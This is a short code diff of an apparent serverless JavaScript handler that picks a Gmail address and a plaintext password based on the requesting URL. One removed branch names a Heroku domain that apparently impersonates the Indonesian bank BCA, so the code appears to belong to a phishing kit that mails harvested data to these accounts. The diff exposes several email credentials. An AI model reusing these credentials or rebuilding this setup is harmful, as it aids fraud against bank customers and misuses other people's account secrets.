@@ -43,15 +43,10 @@ export default function handler(req, res) {
        email = 'berkahhila240@gmail.com'
        pass = 'sojwfkkemloxouvz'
     }else
-    
-     if (url == 'pilih-tarif-terbaru-bca.herokuapp.com'){
-
-        email = 'jakad278@gmail.com'
-        pass = 'ncvhmetlcc'
 
     } else {
         email = 'jakad2748@gmail.com'
-        pass = 'ncvhmetlriiocc'
+        pass = 'ncmetlriiocc'
     }
         
         try {
